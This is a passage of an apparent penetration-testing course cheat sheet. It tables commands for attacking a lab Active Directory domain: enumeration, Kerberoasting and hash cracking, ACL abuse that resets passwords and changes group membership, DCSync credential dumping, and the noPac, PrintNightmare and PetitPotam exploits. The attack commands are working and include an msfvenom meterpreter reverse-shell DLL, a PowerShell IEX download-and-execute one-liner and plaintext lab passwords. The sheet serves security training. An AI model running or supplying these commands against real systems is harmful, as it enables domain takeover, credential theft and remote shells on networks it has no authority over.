forend -p Klmcargo2 --loggedon-users</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to check for a list of logged on users (<code>--loggedon-users</code>) on the target Windows host. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover any smb shares (<code>--shares</code>). Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and utilizes the CrackMapExec module (<code>-M</code>) <code>spider_plus</code> to go through each readable share (<code>Dev-share</code>) and list all readable files.  The results are outputted in <code>JSON</code>. Performed from a Linux-based host.</td></tr><tr><td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></td><td>Enumerates the target Windows domain using valid credentials and lists shares &amp; permissions available on each within the context of the valid credentials used and the target Windows host (<code>-H</code>). Performed from a Linux-based host.</td></tr><tr><td><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only</code></td><td>Enumerates the target Windows domain using valid credentials and performs a recursive listing (<code>-R</code>) of the specified share (<code>SYSVOL</code>) and only outputs a list of directories (<code>--dir-only</code>) in the share. Performed from a Linux-based host.</td></tr><tr><td><code> rpcclient $&gt; queryuser 0x457</code></td><td>Enumerates a target user account in a Windows domain using its relative identifier (<code>0x457</code>). Performed from a Linux-based host.</td></tr><tr><td><code>rpcclient $&gt; enumdomusers</code></td><td>Discovers user accounts in a target Windows domain and their associated relative identifiers (<code>rid</code>). Performed from a Linux-based host.</td></tr><tr><td><code>psexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.125  </code></td><td>Impacket tool used to connect to the <code>CLI</code>  of a Windows target via the <code>ADMIN$</code> administrative share with valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>wmiexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.5  </code></td><td>Impacket tool used to connect to the <code>CLI</code> of a Windows target via <code>WMI</code> with valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>windapsearch.py -h</code></td><td>Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.</td></tr><tr><td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 --da</code></td><td>Used to enumerate the domain admins group (<code>--da</code>) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p Klmcargo2 -PU</code></td><td>Used to perform a recursive search (<code>-PU</code>) for users with nested permissions using valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>sudo bloodhound-python -u &#39;forend&#39; -p &#39;Klmcargo2&#39; -ns 172.16.5.5 -d inlanefreight.local -c all</code></td><td>Executes the python implementation of BloodHound (<code>bloodhound.py</code>) with valid credentials and specifies a name server (<code>-ns</code>) and target Windows domain (<code>inlanefreight.local</code>)  as well as runs all checks (<code>-c all</code>). Runs using valid credentials. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="Enumeration-by-Living-Off-the-Land"><a href="#Enumeration-by-Living-Off-the-Land" class="headerlink" title="Enumeration by Living Off the Land"></a>Enumeration by Living Off the Land</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Module</code></td><td>PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.</td></tr><tr><td><code>Import-Module ActiveDirectory</code></td><td>Loads the <code>Active Directory</code> PowerShell module from a Windows-based host.</td></tr><tr><td><code>Get-ADDomain</code></td><td>PowerShell cmd-let used to gather Windows domain information from a Windows-based host.</td></tr><tr><td><code>Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code></td><td>PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by <code>ServicePrincipalName</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADTrust -Filter *</code></td><td>PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Filter * | select name</code></td><td>PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Identity &quot;Backup Operators&quot;</code></td><td>PowerShell cmd-let used to search for a specifc group (<code>-Identity &quot;Backup Operators&quot;</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code></td><td>PowerShell cmd-let used to discover the members of a specific group (<code>-Identity &quot;Backup Operators&quot;</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Export-PowerViewCSV</code></td><td>PowerView script used to append results to a <code>CSV</code> file. Performed from a Windows-based host.</td></tr><tr><td><code>ConvertTo-SID</code></td><td>PowerView script used to convert a <code>User</code> or <code>Group</code> name to it’s <code>SID</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainSPNTicket</code></td><td>PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-Domain</code></td><td>PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainController</code></td><td>PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser</code></td><td>PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainComputer</code></td><td>PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroup</code></td><td>PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainOU</code></td><td>PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Find-InterestingDomainAcl</code></td><td>PowerView script used to find object <code>ACLs</code> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember</code></td><td>PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainFileServer</code></td><td>PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainDFSShare</code></td><td>PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGPO</code></td><td>PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroup</code></td><td>PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroupMember</code></td><td>PowerView script enumerate members of a specific local group. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetShare</code></td><td>PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Get-NetSession</code></td><td>PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Test-AdminAccess</code></td><td>PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.</td></tr><tr><td><code>Find-DomainUserLocation</code></td><td>PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.</td></tr><tr><td><code>Find-DomainShare</code></td><td>PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.</td></tr><tr><td><code>Find-InterestingDomainShareFile</code></td><td>PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.</td></tr><tr><td><code>Find-LocalAdminAccess</code></td><td>PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrust</code></td><td>PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ForestTrust</code></td><td>PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignUser</code></td><td>PowerView script that enumerates users who are in groups outside of the user’s domain. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignGroupMember</code></td><td>PowerView script that enumerates groups with users outside of the group’s domain and returns each foreign member. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code></td><td>PowerView script used to list all the members of a target group (<code>&quot;Domain Admins&quot;</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></td><td>PowerView script used to find users on the target Windows domain that have the <code>Service Principal Name</code> set. Performed from a Windows-based host.</td></tr><tr><td><code>.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code></td><td>Runs a tool called <code>Snaffler</code> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Transfering-Files"><a href="#Transfering-Files" class="headerlink" title="Transfering Files"></a>Transfering Files</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo python3 -m http.server 8001</code></td><td>Starts a python web server for quick hosting of files. Performed from a Linux-basd host.</td></tr><tr><td><code>&quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://172.16.5.222/SharpHound.exe&#39;)&quot;</code></td><td>PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.</td></tr><tr><td><code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code></td><td>Starts a impacket <code>SMB</code> server for quick hosting of a file. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo python3 -m pip install .</code></td><td>Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -h</code></td><td>Impacket tool used to display the options and functionality of <code>GetUserSPNs.py</code> from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday</code></td><td>Impacket tool used to get a list of <code>SPNs</code> on the target Windows domain from  a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request</code></td><td>Impacket tool used to download&#x2F;request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev</code></td><td>Impacket tool used to download&#x2F;request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host.</td></tr><tr><td><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs</code></td><td>Impacket tool used to download&#x2F;request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host.</td></tr><tr><td><code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code></td><td>Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using <code>hashcat</code> and a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td></tr><tr><td><code>setspn.exe -Q */*</code></td><td>Used to enumerate <code>SPNs</code> in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</code></td><td>PowerShell script used to download&#x2F;request the TGS ticket of a specific user from a Windows-based host.</td></tr><tr><td><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</code></td><td>Used to download&#x2F;request all TGS tickets from a WIndows-based host.</td></tr><tr><td><code>mimikatz # base64 /out:true</code></td><td><code>Mimikatz</code> command that ensures TGS tickets are extracted in <code>base64</code> format from a Windows-based host.</td></tr><tr><td><code>kerberos::list /export </code></td><td><code>Mimikatz</code> command used to extract the TGS tickets from a Windows-based host.</td></tr><tr><td><code>echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n </code></td><td>Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.</td></tr><tr><td><code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></td><td>Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host.</td></tr><tr><td><code>python2.7 kirbi2john.py sqldev.kirbi</code></td><td>Used to extract the <code>Kerberos ticket</code>. This also creates a file called <code>crack_file</code> from a Linux-based host.</td></tr><tr><td><code>sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39; crack_file &gt; sqldev_tgs_hashcat</code></td><td>Used to modify the <code>crack_file</code> for <code>Hashcat</code> from a Linux-based host.</td></tr><tr><td><code>cat sqldev_tgs_hashcat </code></td><td>Used to view the prepared hash from a Linux-based host.</td></tr><tr><td><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt </code></td><td>Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1  Get-DomainUser * -spn | select samaccountname</code></td><td>Uses PowerView tool to extract <code>TGS Tickets</code> . Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></td><td>PowerView tool used to download&#x2F;request the TGS ticket of a specific ticket and automatically format it for <code>Hashcat</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></td><td>Exports all TGS tickets to a <code>.CSV</code> file (<code>ilfreight_tgs.csv</code>) from a Windows-based host.</td></tr><tr><td><code>cat .\ilfreight_tgs.csv</code></td><td>Used to view the contents of the .csv file from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe</code></td><td>Used to view the options and functionality possible with the tool <code>Rubeus</code>. Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /stats</code></td><td>Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /ldapfilter:&#39;admincount=1&#39; /nowrap</code></td><td>Used to request&#x2F;download TGS tickets for accounts with the <code>admin</code> count set to <code>1</code> then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe kerberoast /user:testspn /nowrap</code></td><td>Used to request&#x2F;download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></td><td>PowerView tool used to check the <code>msDS-SupportedEncryptionType</code> attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host.</td></tr><tr><td><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code></td><td>Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host .</td></tr></tbody></table><h1 id="ACL-Enumeration-amp-Tactics"><a href="#ACL-Enumeration-amp-Tactics" class="headerlink" title="ACL Enumeration &amp; Tactics"></a>ACL Enumeration &amp; Tactics</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Find-InterestingDomainAcl</code></td><td>PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley</code></td><td>Used to import PowerView and retrieve the <code>SID</code> of a specific user account (<code>wley</code>) from a Windows-based host.</td></tr><tr><td><code>Get-DomainObjectACL -Identity * | ? &#123;$_.SecurityIdentifier -eq $sid&#125;</code></td><td>Used to find all Windows domain objects that the user has rights over by mapping the user’s <code>SID</code> to the <code>SecurityIdentifier</code> property from a Windows-based host.</td></tr><tr><td><code>$guid= &quot;00299570-246d-11d0-a768-00aa006e0529&quot;   Get-ADObject -SearchBase &quot;CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)&quot; -Filter &#123;ObjectClass -like &#39;ControlAccessRight&#39;&#125; -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?&#123;$_.rightsGuid -eq $guid&#125; | fl</code></td><td>Used to perform a reverse search &amp; map to a <code>GUID</code> value from a Windows-based host.</td></tr><tr><td><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? &#123;$_.SecurityIdentifier -eq $sid&#125; </code></td><td>Used to discover a domain object’s ACL by performing a search based on GUID’s (<code>-ResolveGUIDs</code>) from a Windows-based host.</td></tr><tr><td><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></td><td>Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host.</td></tr><tr><td><code>foreach($line in [System.IO.File]::ReadLines(&quot;C:\Users\htb-student\Desktop\ad_users.txt&quot;)) &#123;get-acl  &quot;AD:\$(Get-ADUser $line)&quot; | Select-Object Path -ExpandProperty Access | Where-Object &#123;$_.IdentityReference -match &#39;INLANEFREIGHT\\wley&#39;&#125;&#125;</code></td><td>A <code>foreach loop</code> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the <code>Get-ADUser</code> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.</td></tr><tr><td><code>$SecPassword = ConvertTo-SecureString &#39;&lt;PASSWORD HERE&gt;&#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&#39;INLANEFREIGHT\wley&#39;, $SecPassword) </code></td><td>Used to create a <code>PSCredential Object</code> from a Windows-based host.</td></tr><tr><td><code>$damundsenPassword = ConvertTo-SecureString &#39;Pwn3d_by_ACLs!&#39; -AsPlainText -Force</code></td><td>Used to create a <code>SecureString Object</code> from a Windows-based host.</td></tr><tr><td><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></td><td>PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-ADGroup -Identity &quot;Help Desk Level 1&quot; -Properties * | Select -ExpandProperty Members</code></td><td>PowerView tool used view the members of a target security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td></tr><tr><td><code>Add-DomainGroupMember -Identity &#39;Help Desk Level 1&#39; -Members &#39;damundsen&#39; -Credential $Cred2 -Verbose</code></td><td>PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; | Select MemberName</code></td><td>PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host.</td></tr><tr><td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @&#123;serviceprincipalname=&#39;notahacker/LEGIT&#39;&#125; -Verbose</code></td><td>PowerView tool used create a fake <code>Service Principal Name</code> given a sepecift user (<code>adunn</code>) from a Windows-based host.</td></tr><tr><td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></td><td>PowerView tool used to remove the fake <code>Service Principal Name</code> created during the attack from a Windows-based host.</td></tr><tr><td><code>Remove-DomainGroupMember -Identity &quot;Help Desk Level 1&quot; -Members &#39;damundsen&#39; -Credential $Cred2 -Verbose</code></td><td>PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td></tr><tr><td><code>ConvertFrom-SddlString</code></td><td>PowerShell cmd-let used to covert an <code>SDDL string</code> into a readable format. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -Identity adunn  | select samaccountname,objectsid,memberof,useraccountcontrol |fl</code></td><td>PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host.</td></tr><tr><td><code>$sid= &quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? &#123; ($_.ObjectAceType -match &#39;Replication-Get&#39;)&#125; | ?&#123;$_.SecurityIdentifier -match $sid&#125; | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</code></td><td>Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool <code>Get-ObjectAcl</code> to check a specific user’s replication rights. Performed from a Windows-based host.</td></tr><tr><td><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss</code></td><td>Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>inlanefreight_hashes</code>). Performed from a Linux-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</code></td><td>Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host.</td></tr></tbody></table><h1 id="Privileged-Access"><a href="#Privileged-Access" class="headerlink" title="Privileged Access"></a>Privileged Access</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Desktop Users&quot;</code></td><td>PowerView based tool to used to enumerate the <code>Remote Desktop Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td></tr><tr><td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Management Users&quot;</code></td><td>PowerView based tool to used to enumerate the <code>Remote Management Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td></tr><tr><td><code>$password = ConvertTo-SecureString &quot;Klmcargo2&quot; -AsPlainText -Force</code></td><td>Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host.</td></tr><tr><td><code>$cred = new-object System.Management.Automation.PSCredential (&quot;INLANEFREIGHT\forend&quot;, $password)</code></td><td>Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host.</td></tr><tr><td><code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code></td><td>Uses the PowerShell cmd-let <code>Enter-PSSession</code> to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code> &amp; <code>$password</code>).</td></tr><tr><td><code>evil-winrm -i 10.129.201.234 -u forend</code></td><td>Used to establish a PowerShell session with a Windows target from a Linux-based host using <code>WinRM</code>.</td></tr><tr><td><code>Import-Module .\PowerUpSQL.ps1</code></td><td>Used to import the <code>PowerUpSQL</code> tool.</td></tr><tr><td><code>Get-SQLInstanceDomain</code></td><td>PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.</td></tr><tr><td><code>Get-SQLQuery -Verbose -Instance &quot;172.16.5.150,1433&quot; -username &quot;inlanefreight\damundsen&quot; -password &quot;SQL1234!&quot; -query &#39;Select @@version&#39;</code></td><td>PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query &#39;Select @@version&#39;</code>) from a Windows-based host.</td></tr><tr><td><code>mssqlclient.py</code></td><td>Impacket tool used to display the functionality and options provided with <code>mssqlclient.py</code> from a Linux-based host.</td></tr><tr><td><code>mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</code></td><td>Impacket tool used to connect to a MSSQL server from a Linux-based host.</td></tr><tr><td><code>SQL&gt; help</code></td><td>Used to display mssqlclient.py options once connected to a MSSQL server.</td></tr><tr><td><code>SQL&gt; enable_xp_cmdshell</code></td><td>Used to enable <code>xp_cmdshell stored procedure</code> that allows for executing OS commands via the database from a Linux-based host.</td></tr><tr><td><code>xp_cmdshell whoami /priv</code></td><td>Used to enumerate rights on a system using <code>xp_cmdshell</code>.</td></tr></tbody></table><h1 id="NoPac"><a href="#NoPac" class="headerlink" title="NoPac"></a>NoPac</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo git clone https://github.com/Ridter/noPac.git</code></td><td>Used to clone a <code>noPac</code> exploit using git. Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code></td><td>Runs <code>scanner.py</code> to check if a target system is vulnerable to <code>noPac</code>&#x2F;<code>Sam_The_Admin</code> from a Linux-based host.</td></tr><tr><td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></td><td>Used to exploit the <code>noPac</code>&#x2F;<code>Sam_The_Admin</code>  vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></td><td>Used to exploit the <code>noPac</code>&#x2F;<code>Sam_The_Admin</code>  vulnerability and perform a <code>DCSync</code> attack against the built-in Administrator account on a Domain Controller from a Linux-based host.</td></tr></tbody></table><h1 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code></td><td>Used to clone a PrintNightmare exploit  using git from a Linux-based host.</td></tr><tr><td><code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code></td><td>Used to ensure the exploit author’s (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.</td></tr><tr><td><code>rpcdump.py @172.16.5.5 | egrep &#39;MS-RPRN|MS-PAR&#39;</code></td><td>Used to check if a Windows target has <code>MS-PAR</code> &amp; <code>MSRPRN</code> exposed from a Linux-based host.</td></tr><tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code></td><td>Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.</td></tr><tr><td><code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code></td><td>Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.</td></tr><tr><td><code>sudo python3 CVE-2021-1675.py inlanefreight.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 &#39;\\10.129.202.111\CompData\backupscript.dll&#39;</code></td><td>Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></td><td>Impacket tool used to create an <code>NTLM relay</code> by specifiying the web enrollment URL for the <code>Certificate Authority</code> host. Perfomred from a Linux-based host.</td></tr><tr><td><code>git clone https://github.com/topotam/PetitPotam.git</code></td><td>Used to clone the <code>PetitPotam</code> exploit using git. Performed from a Linux-based host.</td></tr><tr><td><code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></td><td>Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host.</td></tr><tr><td><code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code></td><td>Uses <code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller 